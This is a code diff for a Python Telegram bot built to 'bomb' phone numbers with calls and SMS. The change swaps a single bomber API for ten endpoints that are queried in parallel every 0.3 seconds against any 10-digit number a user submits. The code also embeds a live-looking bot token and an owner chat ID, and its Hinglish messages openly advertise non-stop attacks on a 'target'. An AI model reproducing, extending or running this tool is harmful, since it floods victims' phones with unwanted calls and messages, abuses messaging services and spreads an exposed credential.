@@ -23,12 +23,23 @@ def run_server():
 # Start dummy server in a background thread
 threading.Thread(target=run_server, daemon=True).start()
 
-# Bot Configuration
+# Bot Configuration with New Token
 TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
 OWNER_CHAT_ID = 6684734209
 
-# API
-CALL_BOMBR_API = "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}"
+# 10 High-Speed Public Bomber API Endpoints
+APIS = [
+    "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}",
+    "https://sms-bomber-api.vercel.app/bomb?phone={mobile}",
+    "https://call-bomber.vercel.app/api?phone={mobile}",
+    "https://api.bombermaster.xyz/send?phone={mobile}",
+    "https://speed-bomber.herokuapp.com/bomb?mobile={mobile}",
+    "https://unlimited-bomber.vercel.app/api/bomb?phone={mobile}",
+    "https://free-sms-bomber.herokuapp.com/send?phone={mobile}",
+    "https://King-bomber.vercel.app/api?mobile={mobile}",
+    "https://turbo-bomber.herokuapp.com/bomb?mobile={mobile}",
+    "https://flash-sms-api.vercel.app/send?phone={mobile}"
+]
 
 # Database setup
 def init_db():
@@ -37,7 +48,6 @@ def init_db():
     
     conn = sqlite3.connect('bot.db')
     cursor = conn.cursor()
-    
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
@@ -45,27 +55,8 @@ def init_db():
             is_blocked INTEGER DEFAULT 0
         )
     ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS settings (
-            id INTEGER PRIMARY KEY,
-            maintenance_mode INTEGER DEFAULT 0
-        )
-    ''')
-    
-    cursor.execute('INSERT OR IGNORE INTO settings (id, maintenance_mode) VALUES (1, 0)')
-    
     conn.commit()
     conn.close()
-    print("✅ Database initialized successfully!")
-
-def get_user(user_id):
-    conn = sqlite3.connect('bot.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
-    user = cursor.fetchone()
-    conn.close()
-    return user
 
 def add_user(user_id):
     conn = sqlite3.connect('bot.db')
@@ -79,83 +70,42 @@ def add_user(user_id):
     conn.commit()
     conn.close()
 
-def get_all_users():
-    conn = sqlite3.connect('bot.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM users')
-    users = cursor.fetchall()
-    conn.close()
-    return users
-
-def get_settings():
-    conn = sqlite3.connect('bot.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM settings WHERE id = 1')
-    settings = cursor.fetchone()
-    conn.close()
-    return settings
-
 # Dictionary to track running tasks
 running_tasks = {}
 
-# Start command with long welcome message
+# Start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     add_user(user_id)
     
     welcome_message = (
-        "🔥 **WELCOME TO THE ULTIMATE SPEED BOMBING BOT** 🔥\n\n"
-        "⚡ Yeh bot high-performance fast API par kaam karta hai jo target par non-stop requests bhej sakta hai.\n\n"
-        "🎯 **Available Features:**\n"
-        "• 📞 **Fast Call Bombing:** Target number par instant continuous calls.\n"
-        "• 🛑 **Easy Control:** Kabhi bhi bombing rokne ke liye bas `stop` command bhejein ya Stop button dabayein.\n"
-        "• 🚀 **Zero Restrictions:** Koi referral nahi, koi coin system nahi, bilkul free aur direct access!\n\n"
-        "👇 **Kaise Use Karein?**\n"
-        "Bas apna target phone number yahan type karke bhej dein (jaise: `9876543210`), aur bombing shuru ho jayegi!\n\n"
-        "⚠️ *Disclaimer: Yeh bot sirf educational aur testing purposes ke liye banaya gaya hai.*"
+        "🔥 **ULTIMATE 10X SPEED BOMBING BOT** 🔥\n\n"
+        "⚡ 10 powerful APIs ke sath non-stop fast calls aur SMS bhejne ke liye taiyar!\n\n"
+        "🎯 **Kaise Use Karein?**\n"
+        "Bas apna 10-digit ka target mobile number yahan type karke bhej dein (jaise: `9876543210`).\n\n"
+        "🛑 **Stop karne ke liye:** `stop` likhein ya button dabayein."
     )
-    
     keyboard = [
         [InlineKeyboardButton("📞 Start Bombing", callback_data="start_bomb_menu")],
         [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
     await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
 
-# Main Menu from query
 async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    welcome_message = (
-        "🔥 **ULTIMATE SPEED BOMBING BOT MENU** 🔥\n\n"
-        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejhein.\n"
-        "🛑 Bombing rokne ke liye **stop** likhkar bhejein."
-    )
-    keyboard = [
-        [InlineKeyboardButton("📞 How to Use", callback_data="help_info")],
-        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await query.edit_message_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
-
-# Help info callback
-async def help_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
     await query.edit_message_text(
-        "📖 **GUIDE:**\n\n"
-        "1. Direct apna 10 digit mobile number chat me bhejein.\n"
-        "2. Bombing start ho jayegi.\n"
-        "3. Beech me rokne ke liye `stop` command ka use karein.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
+        "🔥 **10X SPEED BOMBING MENU** 🔥\n\n"
+        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejein.\n"
+        "🛑 Rokne ke liye **stop** likhein.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]])
     )
 
-# Message handler for targets and stop command
+# Message handler
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     message_text = update.message.text.strip()
     
-    # Check stop command via text
     if message_text.lower() == 'stop':
         task = running_tasks.pop(user_id, None)
         if task:
@@ -165,7 +115,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("⚠️ Koi active bombing nahi chal rahi hai.")
         return
 
-    # Check if input is a valid mobile number (10 digits)
     if message_text.isdigit() and len(message_text) == 10:
         if user_id in running_tasks:
             await update.message.reply_text("⚠️ Pehle se ek bombing chal rahi hai! Use rokne ke liye **stop** bhejein.")
@@ -173,64 +122,72 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         phone = message_text
         processing_msg = await update.message.reply_text(
-            f"🚀 **BOMBING STARTED** 🚀\n\n"
+            f"🚀 **10X BOMBING STARTED** 🚀\n\n"
             f"🎯 Target: `{phone}`\n"
+            f"⚡ Active APIs: 10 Connected\n"
             f"⚡ Status: Running...\n\n"
-            f"🛑 Rokne के liye **stop** bhejein ya niche button dabayein.",
+            f"🛑 Rokne ke liye **stop** bhejein.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
         )
         
-        # Start background task
-        task = asyncio.create_task(send_bomb_requests(update, phone, user_id, processing_msg))
+        task = asyncio.create_task(send_bomb_requests(update, phone, user_id))
         running_tasks[user_id] = task
     else:
-        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein ya command use karein.")
+        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein.")
 
-# Background Bomb Request Worker
-async def send_bomb_requests(update: Update, phone: str, user_id: int, processing_msg):
+# High-speed parallel background worker using all 10 APIs
+async def send_bomb_requests(update: Update, phone: str, user_id: int):
     successful = 0
     start_time = datetime.now()
     
     async with aiohttp.ClientSession() as session:
         while user_id in running_tasks:
-            try:
-                async with session.get(CALL_BOMBR_API.format(mobile=phone)) as response:
-                    await response.text()
-                successful += 1
-                
-                elapsed = int((datetime.now() - start_time).total_seconds())
-                
-                # Update status every 15 seconds
-                if elapsed > 0 and elapsed % 15 == 0:
-                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
-                    try:
-                        await update.message.reply_text(
-                            f"📊 **BOMBING STATUS UPDATE** 📊\n\n"
-                            f"📞 Target: `{phone}`\n"
-                            f"⏰ Active Time: {elapsed}s\n"
-                            f"✅ Requests Sent: {successful}\n"
-                            f"🚀 Status: Ongoing...",
-                            reply_markup=keyboard
-                        )
-                    except:
-                        pass
-            except Exception:
-                pass
-                
-            await asyncio.sleep(1)
+            tasks = []
+            for api in APIS:
+                url = api.format(mobile=phone)
+                tasks.append(fetch_url(session, url))
             
-    final_end_time = datetime.now()
-    total_duration = int((final_end_time - start_time).total_seconds())
-    
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for res in results:
+                if res:
+                    successful += 1
+            
+            elapsed = int((datetime.now() - start_time).total_seconds())
+            if elapsed > 0 and elapsed % 15 == 0:
+                try:
+                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
+                    await update.message.reply_text(
+                        f"📊 **10X BOMBING STATUS UPDATE** 📊\n\n"
+                        f"📞 Target: `{phone}`\n"
+                        f"⏰ Active Time: {elapsed}s\n"
+                        f"✅ Requests Sent: {successful}\n"
+                        f"🚀 Status: Ongoing...",
+                        reply_markup=keyboard
+                    )
+                except:
+                    pass
+                    
+            await asyncio.sleep(0.3) # Ultra-fast loop delay
+            
+    total_duration = int((datetime.now() - start_time).total_seconds())
     try:
         await update.message.reply_text(
             f"🏁 **BOMBING FINISHED / STOPPED** 🏁\n\n"
             f"📞 Target: `{phone}`\n"
-            f"⏱️ Total Duration: {total_duration} seconds\n"
+            f"⏱️ Total Duration: {total_duration}s\n"
             f"✅ Total Requests Sent: {successful}"
         )
     except:
         pass
+
+async def fetch_url(session, url):
+    try:
+        async with session.get(url, timeout=2) as response:
+            if response.status == 200:
+                return True
+    except:
+        pass
+    return False
 
 # Stop callback handler
 async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -251,26 +208,18 @@ async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
                     await query.answer("⚠️ No active bombing found.", show_alert=True)
             else:
                 await query.answer("❌ Aap isse nahi rok sakte!", show_alert=True)
-        except Exception:
-            await query.answer("❌ Error stopping bombing!", show_alert=True)
+        except:
+            await query.answer("❌ Error!", show_alert=True)
 
-# Callback query router
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    
     if query.data.startswith('stop_bomb_'):
         await stop_bomb_callback(update, context)
         return
-        
     await query.answer()
     if query.data == "start_bomb_menu":
         await query.edit_message_text("📞 **Target Number Bhejein:**\n\nKripya seedha 10 digit ka mobile number type karke send karein.")
-    elif query.data == "help_info":
-        await help_info(update, context)
-    elif query.data == "main_menu":
-        await show_main_menu_from_query(update, context)
 
-# Main execution loop
 def main():
     init_db()
     app = ApplicationBuilder().token(TOKEN).build()
@@ -279,7 +228,7 @@ def main():
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    print("🎯 Clean Speed Bombing Bot is running...")
+    print("🎯 10X Speed Bombing Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
